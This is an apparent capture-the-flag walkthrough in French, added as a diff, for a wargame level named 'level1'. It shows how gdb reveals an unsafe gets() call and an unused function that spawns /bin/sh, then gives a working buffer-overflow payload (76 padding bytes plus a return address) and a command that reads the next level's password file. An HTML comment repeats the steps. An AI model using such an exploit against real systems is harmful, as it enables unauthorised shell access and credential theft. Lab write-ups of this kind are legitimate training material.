@@ -1,0 +1,25 @@
+
+
+
+
+1. gdb level1
+2. function gets == bufferoverflow possible
+3. info function nous revele la presence d'une function non utilise 'run' contenant un system de 0x8048584 (/bin/sh)
+4. On doit donc bufferoverflow gets et lui donner l'adresse de run pour pouvoir ouvrir un shell.
+5. python -c 'print "a"*76+"\x44\x84\x04\x08"' > /tmp/shellcode
+6. cat /tmp/shellcode - | ./level1
+7. cat /home/user/level2/.pass
+
+
+
+<!-- 
+
+2. Une fois executer le programme level1 attends une string sur l'entre standart3. (gdb) disass main, on voit que la fonction gets est utilise pour recuperer la string, un bufferoverflow est donc realisable
+4. Insertion d'un shellcode ne marche pas
+5. dans (gdb)info function on voit une fonction run qui n'est apparament pas appeller
+6.disass run -> addr = 0x08048444
+7.On va dont inserer un call a run a la fin de notre string pour use la fail bufferoverflow
+8. python -c 'print "a"*76+"\x44\x84\x04\x08"' > /tmp/file
+9. cat /tmp/file - | ./level1
+
+ -->
